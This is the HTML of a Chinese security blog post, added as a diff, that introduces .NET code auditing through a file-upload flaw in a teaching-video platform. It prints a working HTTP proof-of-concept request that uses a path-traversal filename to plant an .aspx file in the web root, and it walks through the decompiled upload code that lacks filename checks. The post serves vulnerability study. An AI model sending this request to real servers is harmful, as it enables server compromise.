@@ -1,0 +1,655 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+
+
+
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+  <meta name="author" content="Hehanzzz">
+
+
+  <meta name="subtitle" content="“冬将尽，春可期”">
+
+
+  <meta name="description" content="Hehanzzz">
+
+
+
+<title>从某教学视频应用云平台入门.net审计 | Hehanzzz’s Blog</title>
+
+
+
+<link rel="icon" href="/favicon.ico">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/nprogress/nprogress.css">
+
+
+
+<script src="/lib/jquery.min.js"></script>
+
+
+<script src="/lib/iconify-icon.min.js"></script>
+
+
+<script src="https://cdn.tailwindcss.com?plugins=typography"></script>
+<script>
+  tailwind.config = {
+    darkMode: "class",
+  };
+</script>
+
+
+<script src="/lib/nprogress/nprogress.js"></script>
+
+<script>
+  $(document).ready(() => {
+    NProgress.configure({
+      showSpinner: false,
+    });
+    NProgress.start();
+    $("#nprogress .bar").css({
+      background: "#de7441",
+    });
+    $("#nprogress .peg").css({
+      "box-shadow": "0 0 2px #de7441, 0 0 4px #de7441",
+    });
+    $("#nprogress .spinner-icon").css({
+      "border-top-color": "#de7441",
+      "border-left-color": "#de7441",
+    });
+    setTimeout(function () {
+      NProgress.done();
+      $(".fade").removeClass("out");
+    }, 800);
+  });
+</script>
+
+<script>
+  (function () {
+    const prefersDark =
+      window.matchMedia &&
+      window.matchMedia("(prefers-color-scheme: dark)").matches;
+    const setting = localStorage.getItem("hexo-color-scheme") || "auto";
+    if (setting === "dark" || (prefersDark && setting !== "light"))
+      document.documentElement.classList.toggle("dark", true);
+    let isDark = document.documentElement.classList.contains("dark");
+  })();
+
+  $(document).ready(function () {
+    // init icon
+    const prefersDark =
+      window.matchMedia &&
+      window.matchMedia("(prefers-color-scheme: dark)").matches;
+    const isDark = document.documentElement.classList.contains("dark");
+    $("#theme-icon").attr("icon", isDark ? "ri:moon-line" : "ri:sun-line");
+
+    function toggleGiscusTheme() {
+      const isDark = document.documentElement.classList.contains("dark");
+      const giscusFrame = document.querySelector("iframe.giscus-frame");
+      if (giscusFrame) {
+        giscusFrame.contentWindow.postMessage(
+          {
+            giscus: {
+              setConfig: {
+                theme: isDark ? "dark" : "light",
+              },
+            },
+          },
+          "https://giscus.app"
+        );
+      }
+    }
+
+
+    // toggle dark mode
+    function toggleDark() {
+      let isDark = document.documentElement.classList.contains("dark");
+      const setting = localStorage.getItem("hexo-color-scheme") || "auto";
+      isDark = !isDark;
+      document.documentElement.classList.toggle("dark", isDark);
+      $("#theme-icon").attr("icon", isDark ? "ri:moon-line" : "ri:sun-line");
+      if (prefersDark === isDark) {
+        localStorage.setItem("hexo-color-scheme", "auto");
+      } else {
+        localStorage.setItem("hexo-color-scheme", isDark ? "dark" : "light");
+      }
+      toggleGiscusTheme();
+    }
+    $("#toggle-dark").click(toggleDark);
+
+    // listen dark mode change
+    window
+      .matchMedia("(prefers-color-scheme: dark)")
+      .addEventListener("change", (e) => {
+        const setting = localStorage.getItem("hexo-color-scheme") || "auto";
+        if (setting === "auto") {
+          document.documentElement.classList.toggle("dark", e.matches);
+          $("#theme-icon").attr(
+            "icon",
+            e.matches ? "ri:moon-line" : "ri:sun-line"
+          );
+          toggleGiscusTheme();
+        }
+      });
+  });
+</script>
+
+
+
+
+<meta name="generator" content="Hexo 7.0.0"></head>
+<body class="font-sans bg-white dark:bg-zinc-900 text-gray-700 dark:text-gray-200 relative">
+  <header class="fixed w-full px-5 py-1 z-10 backdrop-blur-xl backdrop-saturate-150 border-b border-black/5">
+  <div class="max-auto">
+    <nav class="flex items-center text-base">
+      <a href="/" class="group">
+        <h2 class="font-medium tracking-tighterp text-l p-2">
+          <img class="w-5 mr-2 inline-block transition-transform group-hover:rotate-[30deg]" id="logo" src="/images/logo.svg" alt="Hehanzzz’s Blog" />
+          Hehanzzz’s Blog
+        </h2>
+      </a>
+      <div id="header-title" class="opacity-0 md:ml-2 md:mt-[0.1rem] text-xs font-medium whitespace-nowrap overflow-hidden overflow-ellipsis">
+        从某教学视频应用云平台入门.net审计
+      </div>
+      <div class="flex-1"></div>
+      <div class="flex items-center gap-3">
+        
+          <a class="hidden sm:flex" href="/archives">Posts</a>
+        
+        
+          
+            <a class="w-5 h-5 hidden sm:flex" title="Github" target="_blank" rel="noopener" href="https://github.com/hehanzzz">
+              <iconify-icon width="20" icon="ri:github-line"></iconify-icon>
+            </a>
+          
+            <a class="w-5 h-5 hidden sm:flex" title="Twitter" target="_blank" rel="noopener" href="https://x.com/hehanzzz">
+              <iconify-icon width="20" icon="ri:twitter-line"></iconify-icon>
+            </a>
+          
+        
+        <a class="w-5 h-5 hidden sm:flex" title="Twitter" href="rss2.xml">
+          <iconify-icon width="20" icon="ri:rss-line"></iconify-icon>
+        </a>
+        <a class="w-5 h-5" title="toggle theme" id="toggle-dark">
+          <iconify-icon width="20" icon="" id="theme-icon"></iconify-icon>
+        </a>
+      </div>
+      <div class="flex items-center justify-center gap-3 ml-3 sm:hidden">
+        <span class="w-5 h-5" aria-hidden="true" role="img" id="open-menu">
+          <iconify-icon width="20" icon="carbon:menu" ></iconify-icon>
+        </span>
+        <span class="w-5 h-5 hidden" aria-hidden="true" role="img" id="close-menu">
+          <iconify-icon  width="20" icon="carbon:close" ></iconify-icon>
+        </span>
+      </div>
+    </nav>
+  </div>
+</header>
+<div id="menu-panel" class="h-0 overflow-hidden sm:hidden fixed left-0 right-0 top-12 bottom-0 z-10">
+  <div id="menu-content" class="relative z-20 bg-white/80 px-6 sm:px-8 py-2 backdrop-blur-xl -translate-y-full transition-transform duration-300">
+    <ul class="nav flex flex-col sm:flex-row text-sm font-medium">
+      
+        <li class="nav-portfolio sm:mx-2 border-b sm:border-0 border-black/5 last:border-0 hover:text-main">
+          <a href="/archives" class="flex h-12 sm:h-auto items-center">Posts</a>
+        </li>
+      
+    </ul>
+  </div>
+  <div class="mask bg-black/20 absolute inset-0"></div>
+</div>
+
+  <main class="pt-14">
+    <!-- css -->
+
+<link rel="stylesheet" href="/lib/fancybox/fancybox.min.css">
+
+
+<link rel="stylesheet" href="/lib/tocbot/tocbot.min.css">
+
+<!-- toc -->
+
+  <!-- tocbot -->
+<nav class="post-toc toc text-sm w-48 relative top-32 right-0 opacity-70 hidden lg:block" style="position: fixed !important;"></nav>
+
+
+<section class="px-6 max-w-prose mx-auto md:px-0">
+  <!-- header -->
+  <header class="overflow-hidden pt-6 pb-6 md:pt-12">
+    <div class="pt-4 md:pt-6">
+      <h1 id="article-title" class="text-[2rem] font-bold leading-snug mb-4 md:mb-6 md:text-[2.6rem]">
+        从某教学视频应用云平台入门.net审计
+      </h1>
+      <div>
+        <section class="flex items-center gap-3 text-sm">
+          <span class="flex items-center gap-1">
+            <iconify-icon width="18" icon="carbon-calendar" ></iconify-icon>
+            <time>2023-12-25</time>
+          </span>
+          <span class="text-gray-400">·</span>
+          <span class="flex items-center gap-1">
+            <iconify-icon width="18" icon="ic:round-access-alarm" ></iconify-icon>
+            <span>10 min</span>
+          </span>
+          <span class="text-gray-400">·</span>
+          <span class="flex items-center gap-1">
+            <iconify-icon width="18" icon="icon-park-outline:font-search" ></iconify-icon>
+            <span>2.7k words</span>
+          </span>
+          
+        </section>
+      </div>
+    </div>
+  </header>
+  <!-- content -->
+  <article class="post-content prose m-auto slide-enter-content dark:prose-invert">
+    <p>.net代码审计入门</p>
+<span id="more"></span>
+
+<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>前段时间深情爷给我发了一个Poc，是某教学视频应用云平台的文件上传，故事也从这里展开……</p>
+<p>得到Poc后试了一下，一不小心找到了源码（真·纯安装源码），拿到自己电脑上进行一通瞎搞，一头雾水</p>
+<p>由于自己之前没接触过.net的审计，于是跟几个师傅学习了一下.net的审计方法，也是拿到了他们的审计报告进行学习，由于这套代码比较简单，也属于是入门级别，于是打算记录下来。</p>
+<p>需要注意的是，目前挖出的所有漏洞官方都已修复！请勿用于违法用途，本文仅供学习。</p>
+<p><img src="/../images/netdaimashengji/nday.png"></p>
+<h1 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h1><p>.net是一款可以使用 C#、F# 或 Visual Basic 编写的框架，本意是微软用来对标JAVA的，有关的语言学习可以看看官网：<a target="_blank" rel="noopener" href="https://dotnet.microsoft.com/zh-cn/languages">.NET 编程语言 | C#、F# 和 Visual Basic (microsoft.com)</a></p>
+<p>在.net中通常使用C#语言进行编写，通常判断网站是否是.net网站可以看看他的后缀是啥，aspx就是.net的网站，在拿到一份.net源码的时候，我们得了解每个C#文件的作用含义，了解如何进行审计，工具是什么，路由怎么看</p>
+<h2 id="C-文件后缀作用及位置"><a href="#C-文件后缀作用及位置" class="headerlink" title="C#文件后缀作用及位置"></a>C#文件后缀作用及位置</h2><ol>
+<li><strong>.aspx：</strong><ul>
+<li><strong>用途：</strong> ASP.NET 网页文件。</li>
+<li><strong>描述：</strong> 包含网页的标记和服务器端代码，用于构建动态的 Web 页面。</li>
+</ul>
+</li>
+<li><strong>.cs：</strong><ul>
+<li><strong>用途：</strong> C# 源代码文件。</li>
+<li><strong>描述：</strong> 包含 C# 编程语言的源代码，用于实现应用程序的逻辑和功能。</li>
+</ul>
+</li>
+<li><strong>.aspx.cs：</strong><ul>
+<li><strong>用途：</strong> ASP.NET 网页的代码文件（与 .aspx 配套）。</li>
+<li><strong>描述：</strong> 包含与 .aspx 文件相关联的 C# 代码，用于处理页面的服务器端逻辑。</li>
+</ul>
+</li>
+<li><strong>.ascx：</strong><ul>
+<li><strong>用途：</strong> ASP.NET 用户控件文件。</li>
+<li><strong>描述：</strong> 包含可在多个页面中重复使用的自定义用户界面组件，用于提高代码的可维护性和可重用性。</li>
+</ul>
+</li>
+<li><strong>.asmx：</strong><ul>
+<li><strong>用途：</strong> ASP.NET Web 服务文件。</li>
+<li><strong>描述：</strong> 包含用于提供 Web 服务的代码和逻辑，支持通过 SOAP（Simple Object Access Protocol）进行通信。</li>
+</ul>
+</li>
+<li><strong>.asax：</strong><ul>
+<li><strong>用途：</strong> 全局应用程序类文件。</li>
+<li><strong>描述：</strong> 包含应用程序的全局事件处理和初始化代码，如应用程序启动时的逻辑。</li>
+</ul>
+</li>
+<li><strong>.soap：</strong><ul>
+<li><strong>用途：</strong> SOAP 文件。</li>
+<li><strong>描述：</strong> 包含使用 SOAP 协议定义的 Web 服务的描述信息。</li>
+</ul>
+</li>
+<li><strong>.dll：</strong><ul>
+<li><strong>用途：</strong> 动态链接库文件。</li>
+<li><strong>描述：</strong> 包含已编译的代码和库，可供应用程序调用和重用。通常用于将代码分割成模块，提高可维护性和复用性。</li>
+</ul>
+</li>
+</ol>
+<p>用此可看出 <strong>dll、aspx、aspx.cs</strong> 这三个文件是我们需要去关注的</p>
+<p>在一个典型的 ASP.NET Web 应用程序中，.dll、.aspx 和 .aspx.cs 文件通常分布在不同的目录中：</p>
+<ol>
+<li><strong>.dll 文件：</strong><ul>
+<li><strong>位置：</strong> .dll 文件通常位于应用程序的 bin 目录中。</li>
+<li><strong>描述：</strong> 这里存放了编译后的程序集文件，包含了应用程序的已编译代码。这些文件在运行时由 ASP.NET 应用程序引擎加载。</li>
+</ul>
+</li>
+<li><strong>.aspx 文件：</strong><ul>
+<li><strong>位置：</strong> .aspx 文件通常位于应用程序的 Web 页面目录中，例如 Pages 或 Views 目录。</li>
+<li><strong>描述：</strong> 这是 ASP.NET Web 页面文件，包含了页面的 HTML 标记和可能的服务器端代码块。</li>
+</ul>
+</li>
+<li><strong>.aspx.cs 文件：</strong><ul>
+<li><strong>位置：</strong> .aspx.cs 文件通常位于与 .aspx 文件相同的目录中，但通常被组织在 App_Code 或 CodeBehind 等子目录中。</li>
+<li><strong>描述：</strong> 这是与 .aspx 文件关联的服务器端代码文件，包含了与页面相关的 C# 或 VB.NET 代码。</li>
+</ul>
+</li>
+</ol>
+<p>例如，一个简单的目录结构可能如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">arduinoCopy code/YourWebApp</span><br><span class="line">  /bin</span><br><span class="line">    YourWebApp.dll</span><br><span class="line">  /Pages</span><br><span class="line">    Home.aspx</span><br><span class="line">    Home.aspx.cs</span><br><span class="line">  /App_Code</span><br><span class="line">    CommonFunctions.cs</span><br><span class="line">  Web.config</span><br></pre></td></tr></table></figure>
+
+<p>在这个例子中：</p>
+<ul>
+<li>&#x2F;bin 目录包含已编译的  .dll  文件。</li>
+<li>&#x2F;Pages 目录包含 Web 页面的  .aspx  和  .aspx.cs 文件。</li>
+<li>&#x2F;App_Code 目录包含共享的服务器端代码文件。</li>
+</ul>
+<h2 id="反编译工具ILSpy"><a href="#反编译工具ILSpy" class="headerlink" title="反编译工具ILSpy"></a>反编译工具ILSpy</h2><p>前面提到 dll 中存在着我们核心的代码内容，那么应该如何查看呢，这里推荐使用一款工具 ILSpy ，这款工具对可以dll文件进行反编译，查看其内部代码内容，也很方便的将内部代码全部导出为正常的 .cs。</p>
+<p>官方仓库链接：<a target="_blank" rel="noopener" href="https://github.com/icsharpcode/ILSpy">icsharpcode&#x2F;ILSpy: .NET Decompiler with support for PDB generation, ReadyToRun, Metadata (&amp;more) - cross-platform! (github.com)</a></p>
+<p><img src="/../images/netdaimashengji/1.png"></p>
+<p>这里在左上角的文件导入dll文件即可</p>
+<h2 id="aspx文件内容解析"><a href="#aspx文件内容解析" class="headerlink" title="aspx文件内容解析"></a>aspx文件内容解析</h2><p>通常在我们打开aspx文件时，第一行会是以下这样：</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=<span class="string">&quot;C#&quot;</span> AutoEventWireup=<span class="string">&quot;true&quot;</span> CodeBehind=<span class="string">&quot;MyPage.aspx.cs&quot;</span> Inherits=<span class="string">&quot;MyWebApp.MyPage&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这是一个 ASP.NET Web 页面的指令（Directive），用于在页面中指定一些重要的属性和配置</p>
+<p>解析如下：</p>
+<ul>
+<li><strong>&lt;%@ Page：</strong> 这是指令的起始标记，用于定义页面的属性和配置。</li>
+<li><strong>Language&#x3D;”C#”：</strong> 指定服务器端代码使用的编程语言，这里是 C#。</li>
+<li><strong>AutoEventWireup&#x3D;”true”：</strong> 一个布尔值，表示是否启用自动事件绑定。当设置为 true 时，ASP.NET 将自动绑定事件处理程序。</li>
+<li><strong>CodeBehind&#x3D;”MyPage.aspx.cs”：</strong> 指定代码文件的相对路径。在这个例子中，代码文件名为 MyPage.aspx.cs，它通常包含页面的服务器端逻辑。</li>
+<li><strong>Inherits&#x3D;”MyWebApp.MyPage”：</strong> 指定页面的继承关系。这里，MyPage 页面继承自 MyWebApp.MyPage 类。Inherits 属性告诉 ASP.NET 使用指定类中的代码。</li>
+</ul>
+<p>通过这个指令，ASP.NET 可以正确地处理页面，编译代码文件，然后将其与页面关联起来。这使得在 .aspx 页面中可以使用与 .aspx.cs 文件关联的服务器端代码</p>
+<p>在一般的.NET代码中，我们需要特别注意 inherits（继承）部分。它会指向我们需要去找的 dll ，例如前面的示例可能指向的是 MyWebApp.dll ，在MyWebApp.dll中寻找MyPage</p>
+<h1 id="0x02-Poc—前台Nday上传"><a href="#0x02-Poc—前台Nday上传" class="headerlink" title="0x02 Poc—前台Nday上传"></a>0x02 Poc—前台Nday上传</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST /Tools/Video/VideoCover.aspx HTTP/1.1</span><br><span class="line">Host: xxx</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insectre-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 1015 7) AppleWebKit/537.36(KHTML, like Gecko) Chrome/107.0.0.0 Safari 537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avifimage/webp,image/apng,*/*;q=0.8,application/signed-exchangev=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Accept-Language: zh-CN,zh;g=0.9</span><br><span class="line">Cookie: ASP.NET_SessionId=pgfnw0patx4kh0jsnpjgzcmq; PrivateKey=f09020eaf656f9cf5d9292d39c296d1c</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type:multipart/form-data;boundary=----WebKitFormBoundaryVBf7Cs8QWsfwC82M</span><br><span class="line">Content-Length: 294</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryVBf7Cs8QWsfwC82M</span><br><span class="line">Content-Disposition: form-data, name= &quot;file&quot;;filename=&quot;/../../../AVA.ResourcesPlatform.WebUI/test.aspx&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;%@Page Language=&quot;C#&quot;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">Response.Write(&quot;test&quot;);</span><br><span class="line">%&gt;</span><br><span class="line">------WebKitFormBoundaryVBf7Cs8QWsfwC82M--</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>根据Poc在根目录中 Tools&#x2F;Video 下找到 VideoPath.aspx </p>
+<p><img src="/../images/netdaimashengji/2.png"></p>
+<p>这里 Inherits 指向的是 AVA.ResourcesPlatform.AdminUI.Services.WeikeCutOut.UploadFile  类，Inherits 属性告诉 ASP.NET 这个页面将使用指定类中的代码。这里也说了UploadFile 页面继承自 AVA.ResourcesPlatform.AdminUI.Services.WeikeCutOut.UploadFile 类</p>
+<p>所以我们去 bin 目录下找到 AVA.ResourcesPlatform.AdminUI.dll</p>
+<p><img src="/../images/netdaimashengji/3.png"></p>
+<p>把这个dll直接丢到ILSpy进行反编译，在左侧栏中找到对应的UploadFile</p>
+<p><img src="/../images/netdaimashengji/4.png"></p>
+<p>把代码丢出来看看为什么会存在文件上传</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Web;</span><br><span class="line"><span class="keyword">using</span> System.Web.UI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">UploadFile</span> : <span class="title">Page</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">Page_Load</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">base</span>.Request.Files.Count &lt;= <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">try</span></span><br><span class="line">		&#123;</span><br><span class="line">			HttpPostedFile httpPostedFile = <span class="keyword">base</span>.Request.Files[<span class="number">0</span>];</span><br><span class="line">			<span class="built_in">string</span> fileName = httpPostedFile.FileName;</span><br><span class="line">			<span class="built_in">string</span> text = <span class="keyword">base</span>.Request.QueryString[<span class="string">&quot;VideoGuid&quot;</span>];</span><br><span class="line">			<span class="built_in">string</span> text2 = <span class="keyword">base</span>.Server.MapPath(<span class="string">&quot;~/Upload/Video/&quot;</span> + text + <span class="string">&quot;/&quot;</span>);</span><br><span class="line">			<span class="keyword">if</span> (!Directory.Exists(text2))</span><br><span class="line">			&#123;</span><br><span class="line">				Directory.CreateDirectory(text2);</span><br><span class="line">			&#125;</span><br><span class="line">			text2 += httpPostedFile.FileName;</span><br><span class="line">			httpPostedFile.SaveAs(text2);</span><br><span class="line">			<span class="keyword">base</span>.Response.Clear();</span><br><span class="line">			<span class="keyword">base</span>.Response.Write(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span> (Exception ex)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">base</span>.Response.Clear();</span><br><span class="line">			<span class="keyword">base</span>.Response.Write(ex.Message);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先开头导入四个命名空间</p>
+<ol>
+<li>using System;：<ul>
+<li>导入 System 命名空间，这是.NET框架中最基本的命名空间之一，包含了常用的系统类型和功能。例如， Exception 异常就在 System 命名空间中定义。</li>
+</ul>
+</li>
+<li>using System.IO;：<ul>
+<li>导入 System.IO 命名空间，该命名空间提供了文件和流的输入输出操作相关的类。在这段代码中，主要用于处理文件和目录的操作，比如创建目录和保存文件。</li>
+</ul>
+</li>
+<li>using System.Web;：<ul>
+<li>导入System.Web 命名空间，该命名空间包含了与Web开发相关的类和功能。在这里，主要用于处理Web请求和相关的操作，如 HttpPostedFile 。</li>
+</ul>
+</li>
+<li>using System.Web.UI;：<ul>
+<li>导入 System.Web.UI 命名空间，该命名空间包含了与Web用户界面（UI）开发相关的类和功能。在这里，主要用于处理Web页面和控件的开发，比如 Page 类。</li>
+</ul>
+</li>
+</ol>
+<p>有了 using System.IO; 语句，就可以直接使用 Directory 、 File 等类，而不需要写成 System.IO.Directory 、 System.IO.File。这四个库是.NET Framework的一部分，属于是自带的（.NET Framework是由Microsoft开发的一个面向Windows操作系统的软件开发框架，包含了大量的类库和运行时环境，用于支持和简化Windows应用程序和Web应用程序的开发。这个框架在Windows操作系统中是默认安装的。）</p>
+<p>然后使用了 Page_Load 方法，这个方法是当页面被加载时触发的事件，该方法先使用</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">base</span>.Request.Files.Count &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>去判断是否有文件被上传，如果没有文件上传则直接返回</p>
+<p>当有文件上传时，会对上传的文件进行处理</p>
+<p>获取第一个上传的文件：</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HttpPostedFile httpPostedFile = <span class="keyword">base</span>.Request.Files[<span class="number">0</span>];</span><br></pre></td></tr></table></figure>
+
+<p>从上传的文件中获取文件名：</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span> fileName = httpPostedFile.FileName;</span><br></pre></td></tr></table></figure>
+
+<p>从查询字符串中获取名为 “VideoGuid” 的参数：（这里至于为什么是VideoGuid，而不是Poc中的Filename，我也不是很清楚，但是Filename肯定是被传进来进行目录跨越拼接的）</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span> text = <span class="keyword">base</span>.Request.QueryString[<span class="string">&quot;VideoGuid&quot;</span>];</span><br></pre></td></tr></table></figure>
+
+<p>进行目录拼接，然后判断文件夹是否存在，不存在就创建一个</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span> text2 = <span class="keyword">base</span>.Server.MapPath(<span class="string">&quot;~/Upload/Video/&quot;</span> + text + <span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!Directory.Exists(text2))</span><br><span class="line">&#123;</span><br><span class="line">    Directory.CreateDirectory(text2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后通过 text2 与Filename进行拼接成文件路径保存，成功返回Success</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">text2 += httpPostedFile.FileName;</span><br><span class="line">httpPostedFile.SaveAs(text2);</span><br><span class="line"><span class="keyword">base</span>.Response.Clear();</span><br><span class="line"><span class="keyword">base</span>.Response.Write(<span class="string">&quot;Success&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/netdaimashengji/5.png"></p>
+<p>到这里也算简单分析了一次，不提后续如何利用</p>
+<p>至于这里为什么要跨目录进行上传，不能直接上传，是因为，这套系统的目录结构是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xxx.WebUI</span><br><span class="line">xxx.AdminUI	/我们这次分析的dll在这个目录下</span><br></pre></td></tr></table></figure>
+
+<p>要上传到前端得需要跨目录穿</p>
+<p>所以总结一下漏洞成因是因为，文件上传未作限制，文件Filename进行拼接的时候未作过滤，导致运行..&#x2F;存在进行跨目录穿🐎</p>
+<h1 id="0x03-前台上传-1"><a href="#0x03-前台上传-1" class="headerlink" title="0x03 前台上传*1"></a>0x03 前台上传*1</h1><p><em>Hehanzzz 2023年12月25日 夜</em></p>
+
+  </article>
+  <!-- tag -->
+  <div class="mt-12 pt-6 border-t border-gray-200">
+    
+      
+        <span class="bg-gray-100 dark:bg-gray-700 px-2 py-1 m-1 text-sm rounded-md transition-colors hover:bg-gray-200">
+          <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+        </span>
+      
+        <span class="bg-gray-100 dark:bg-gray-700 px-2 py-1 m-1 text-sm rounded-md transition-colors hover:bg-gray-200">
+          <a href="/tags/ASP-NET/">ASP.NET</a>
+        </span>
+      
+    
+  </div>
+  <!-- prev and next -->
+  <div class="flex justify-between mt-12 pt-6 border-t border-gray-200">
+    <div>
+      
+    </div>
+    <div>
+      
+        <a href="/2023/12/23/About-me-%E5%85%B3%E4%BA%8E%E6%88%91/" class="text-sm text-gray-400 hover:text-gray-500 flex justify-center">
+          About me | 关于我
+          <iconify-icon width="20" icon="ri:arrow-right-s-line" data-inline="false"></iconify-icon>
+        </a>
+      
+    </div>
+  </div>
+  <!-- comment -->
+  <div class="article-comments mt-12">
+    
+<script
+  src="https://giscus.app/client.js"
+  data-repo="Hehanzzz/hehanzzz.github.io"
+  data-repo-id="R_kgDOKls9Wg"
+  data-category="Announcements"
+  data-category-id="DIC_kwDOKls9Ws4Cb8Mv"
+  data-mapping="pathname"
+  data-strict="0"
+  data-reactions-enabled="1"
+  data-emit-metadata="0"
+  data-input-position="bottom"
+  data-theme="preferred_color_scheme"
+  data-lang="zh-CN"
+  crossorigin="anonymous"
+  async
+></script>
+<script>
+  window.onload = function () {
+    console.log("giscus loaded");
+    const isDark = document.documentElement.classList.contains("dark");
+    const giscusFrame = document.querySelector("iframe.giscus-frame");
+    giscusFrame.contentWindow.postMessage(
+      {
+        giscus: {
+          setConfig: {
+            theme: isDark ? "dark" : "light",
+          },
+        },
+      },
+      "https://giscus.app"
+    );
+  };
+</script>
+
+
+  </div>
+</section>
+<!-- js inspect -->
+
+<script src="/lib/clipboard.min.js"></script>
+
+
+<script async src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
